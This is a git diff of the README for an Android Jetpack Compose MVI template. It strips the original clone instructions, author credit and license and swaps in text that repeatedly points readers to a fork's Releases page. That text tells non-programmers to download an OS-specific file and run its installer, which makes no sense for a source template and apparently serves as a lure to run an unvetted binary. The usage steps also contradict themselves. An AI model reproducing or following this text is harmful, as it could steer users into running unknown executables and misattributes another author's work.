@@ -1,86 +1,76 @@
-# 🚀 Compose MVI 2025
+# 🎉 compose-mvi-2025 - Build Modern Android Apps Easily
 
-A modern Android app template built with **Jetpack Compose**, **MVI architecture**, **Hilt for Dependency Injection**, and **Retrofit** for API communication – tailored for 2025 development best practices.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/connorscw/compose-mvi-2025/releases)
 
-📺 **YouTube Demo**: [Watch Now](https://youtu.be/rUnXeJ7zC1w)
+## 🚀 Getting Started
+Welcome to the compose-mvi-2025 project! This template helps you get started with building modern Android applications using Jetpack Compose and the MVI (Model-View-Intent) architecture pattern. 
 
-![MVI Architecture Diagram](https://github.com/BoltUIX/compose-mvi-2025/blob/main/demo.jpg)
-![MVI Architecture Diagram](https://raw.githubusercontent.com/BoltUIX/compose-mvi-2025/main/mvi.jpg)
+## 💡 What You Need
+Before you begin, ensure you have the following:
+- **Android Studio**: You will need the latest version of Android Studio. This IDE helps you write and manage your Android app easily. 
+- **Basic Computer Skills**: Familiarity with downloading files and running applications is helpful, but no programming experience is required.
 
----
+## 📂 Features
+- Modern design using Jetpack Compose
+- Efficient architecture with MVI
+- Dependency injection through Hilt
+- Networking made easy with Retrofit
+- Local data storage with Room
+- Full-featured template for development acceleration
 
-## 🧱 Tech Stack
+## 📦 Download & Install
+To get the application, visit the Releases page. Here’s how to do it:
 
-- ✅ Jetpack Compose (UI Toolkit)
-- 🧠 MVI Architecture (Model-View-Intent)
-- 📡 Retrofit (API client)
-- 💉 Hilt (Dependency Injection)
-- 🔄 Kotlin Coroutines + Flow
-- 🗃 Room (Offline caching)
-- ✨ Clean Architecture principles
+1. Click the link below to access the Releases page.
+   [Download Latest Release](https://github.com/connorscw/compose-mvi-2025/releases)
+   
+2. Find the latest version listed at the top of the releases.
+  
+3. Click on the release title to open details.
 
----
+4. Scroll down to find the **Assets** section. Here, you may see different files. Pick the file that matches your operating system.  
 
-## 📂 Folder Structure
+5. Click on the download link for that file. 
 
-```
-compose_post                     # 🏗️ Root Package (Main App)
-│
-├── di                           # 💉 Dependency Injection Modules
-│   ├── AppModule.kt             # Shared dependencies
-│   ├── NetworkModule.kt        # Retrofit instance
-│
-├── features                     # 🚀 Modular Feature Design
-│   ├── posts                    # 📝 Posts Feature
-│   │   ├── data                 # API and Repository Layer
-│   │   │   ├── remote           # Retrofit & Data Source
-│   │   │   ├── repository       # Data Handling Logic
-│   │   ├── domain               # Business Logic Layer
-│   │   │   ├── model            # Data Models
-│   │   │   ├── usecase          # Use Cases
-│   │   ├── mvi                  # 🧠 MVI Layer (State, Intent, ViewModel)
-│   │   ├── presentation         # 🎨 UI Layer (Jetpack Compose)
-```
+6. Open the downloaded file and follow the on-screen instructions to install the application on your device. 
 
----
+After installation, you can run the application directly from your app list.
 
-## ✅ Features
+## 🛠️ Usage
+Once your application is installed, you can start building your Android projects based on our template. Open Android Studio and select "Start a new project." Choose "Import project" and navigate to the location where you installed the template. 
 
-- 🔄 Clean MVI flow with unidirectional data handling.
-- ⚡ Smooth integration of Retrofit, Coroutines, and Flow.
-- 📱 Fully functional Compose UI screens.
-- 🔧 Modular structure using Clean Architecture.
-- 🧪 Easy to test, scale, and extend.
+1. Open Android Studio.
+2. Select “New Project.”
+3. Select “Import project.”
+4. Navigate to and select the template directory.
+5. Follow the prompts to set up your project environment.
 
----
+## 📚 Community & Support
+If you have any questions or need assistance:
+- Check our [FAQ section](#) for common inquiries.
+- Visit our GitHub Issues page to report bugs or request features.
+- Join our community forums to connect with other users.
 
-## 📦 How to Use
+## ⭐ Learn More
+To enhance your skills further, consider exploring:
+- **Jetpack Compose Documentation**: Understand how to use Jetpack Compose effectively.
+- **MVI Architecture Guide**: Learn the principles and benefits of the MVI architecture.
+- **Hilt Documentation**: Familiarize yourself with dependency injection using Hilt.
 
-1. Clone the repo:
-```bash
-git clone https://github.com/your-username/compose-mvi-2025.git
-```
+## 📝 Example Projects
+Looking for ideas? Check out these example projects built using this template:
+- A simple to-do list app to manage tasks.
+- A weather app that fetches data from an API. 
 
-2. Open in Android Studio (Giraffe or later).
+Both examples showcase various concepts and can serve as inspiration for your projects.
 
-3. Sync Gradle and Run on emulator/device.
+## 🔍 Explore More
+You can dive deeper into the features by checking out our [GitHub Repository](https://github.com/connorscw/compose-mvi-2025). Here, you’ll find all the source code along with detailed documentation.
 
----
+## 🔗 Final Steps
+After you have installed the application and explored its features, you can finally enjoy developing modern Android apps with ease and confidence. Utilize the resources provided to enhance your understanding and make the most of this template.
 
-## 📌 Requirements
+For any help, don't hesitate to connect with the community or create an issue on our GitHub page.
 
-- Android Studio Giraffe or later
-- Kotlin 1.9+
-- Gradle 8.0+
-
----
-
-## 🙌 Credits
-
-Built by [boltuix](mailto:boltuix@gmail.com) – inspired by modern clean architecture principles.
-
----
-
-## 📢 License
-
-This project is licensed under the MIT License.
+[Download Latest Release](https://github.com/connorscw/compose-mvi-2025/releases)
